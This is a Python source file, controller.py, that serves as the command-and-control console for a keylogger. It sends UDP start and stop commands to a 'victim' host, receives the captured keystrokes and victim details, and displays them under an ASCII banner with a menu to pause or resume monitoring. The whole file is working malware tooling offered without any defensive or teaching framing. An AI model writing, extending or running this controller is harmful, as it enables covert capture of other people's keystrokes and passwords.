"""
@author: Vuong Van Duy
controller.py
data: 14.10.2025

This script implements a controller that can send UDP commands to start and stop a keylogger.
It also listens for incoming UDP messages from the keylogger to display captured keystrokes.
The controller runs a listener in a separate thread and allows user input to control the keylogger.
"""

import socket, os
import json
import threading
from typing import Optional
import time
import keyboard

banner = """
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀         ┃    
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘         ┃
┃  ⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀         ┃
┃  ⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸         ┃
┃  ⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇         ┃
┃  ⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃         ┃
┃  ⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀         ┃
┃  ⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀         ┃
┃  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ┃"""

class ControllerServer:
    def __init__(self, ip_victim: Optional[str] = None, port_listen: int = 9999, port_send: int = 9998):
        self.ip_victim = ip_victim
        self.port_listen = port_listen
        self.port_send = port_send
        self.buffer = ""
        self.info_victim = "lol"

    def send_command(self, message: str, timeout: float = 2.0):

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            try:
                request = {
                    "command": message
                }
                sent = sock.sendto(json.dumps(request).encode(), (self.ip_victim, self.port_send))
                print(f"Đã gửi {sent} bytes tới {self.ip_victim}:{self.port_send}")
            except socket.timeout:
                pass
            except Exception as e:
                pass

    def listen_clients(self, buffer_size: int = 8192):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.port_listen))
        sock.settimeout(1)
        #print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")

        try:
            while True:
                try:
                    data, _ = sock.recvfrom(buffer_size)
                    data = json.loads(data.decode())
                    data_str = data.get("message", "")
                    signal = data.get("signal", False)
                    ip_victim = data.get("from_ip", None)

                    if self.ip_victim is None or self.ip_victim != ip_victim:
                        self.ip_victim = ip_victim
                        self.send_command(message="Server_active")
                        self.info_victim = data_str
                        print(self.info_victim)
                        continue

                    if signal:
                        self.buffer += data_str
                        os.system('clear')
                        print("\033[32m" + banner + "\033[0m")
                        print(self.info_victim)
                        print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
                        print("Keystroke operation ->", self.buffer)
                        print("Enter 'stop' to stop, 'exit' to quit... ->")
                    else:
                        os.system('clear')
                        print("\033[32m" + banner + "\033[0m")
                        self.buffer = ""
                        print("Stopped. Enter 'start' to restart monitoring, 'exit' to quit... ->")
                except socket.timeout as e:
                    continue
                except json.JSONDecodeError as e:
                    pass
                except OSError as e:
                    print("Socket error:", e)
                    break
        except KeyboardInterrupt:
            print("\nReceived Ctrl+C — shutting down server gracefully.")
        finally:
            sock.close()
            print("Socket closed. Bye.")

class ConsoleMenu:
    def __init__(self):
        self.appname = "★彡━━━━━★ W E L C O M E  T O  K E Y L O G G E R ★━━━━━彡★"
        self.pause_continue = {"Pause": "Pause", "Continue": "Continue"}
        self.options = [
            "Reset", 
            f"{self.pause_continue["Pause"]}", # Continue
            "Exit"
        ]
        self.controller = None
        self.current_selection = 0
        self.running = True
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def draw_menu(self):
        menu_width = len(self.appname) + 6

        print()
        print(banner)
        print("┣" + "━" * menu_width + "┫")
        print("┃  " + self.appname + "  ┃")
        print("┣" + "━" * menu_width + "┫")
        
        for i, option in enumerate(self.options):
            prefix = "-> " if i == self.current_selection else "   "
            option_text = f"{prefix}{option}"
            spaces = menu_width - len(option_text)
            print(f"┃{option_text}{' ' * spaces}┃")
            
        print("┣" + "━" * menu_width + "┫")
        footer = "↑↓ Переключить пункт • Enter Подтвердить"
        padding = (menu_width - len(footer)) // 2
        print("┃" + " " * padding + footer + " " * padding + " ┃")
        print("┗" + "━" * menu_width + "┛")
    
    def handle_input(self):
        if keyboard.is_pressed('up'):
            self.current_selection = (self.current_selection - 1) % len(self.options)  
            self.clear_screen()
            self.draw_menu()
            return True
        elif keyboard.is_pressed('down'):
            self.current_selection = (self.current_selection + 1) % len(self.options)
            self.clear_screen()
            self.draw_menu()
            return True
        elif keyboard.is_pressed('enter'):
            self.execute_selection()
            self.clear_screen()
            self.draw_menu()
            return True
        else:
            self.clear_screen()
            self.draw_menu()
        return False
    
    def execute_selection(self):
        option = self.current_selection
        print(f"\nВыбранная опция: {self.options[option]}")

        if option == 0:
            pass
        if option == 1:  
            if self.options[1] == "Pause":
                self.options[1] = f"{self.pause_continue["Continue"]}"
                self.controller.send_command("stop")
            else:
                self.options[1] = f"{self.pause_continue["Pause"]}"
                self.controller.send_command("start")
        if option == 2:  
            self.running = False
    
    def run(self, controller):
        self.controller = controller
        self.clear_screen()
        self.draw_menu()
        while self.running:
            time.sleep(0.1)
            self.handle_input()
        exit()


def main():
    controller = ControllerServer()
    listener_thread = threading.Thread(target=controller.listen_clients, daemon=True)
    listener_thread.start()
    print("\033[32m" + banner + "\033[0m")
    controller.send_command("start")

    menu = ConsoleMenu()
    menu.run(controller)

    # while True:
    #     command = input("Send cmd (start/stop/exit): ").strip().lower()
    #     if command == "start":
    #         controller.send_command(command)
    #     elif command == "stop":
    #         controller.send_command(command)
    #     elif command == "exit":
    #         print("Exiting...")
    #         break
    #     else:
    #         print("Unknown command.")

if __name__ == "__main__":
    main()
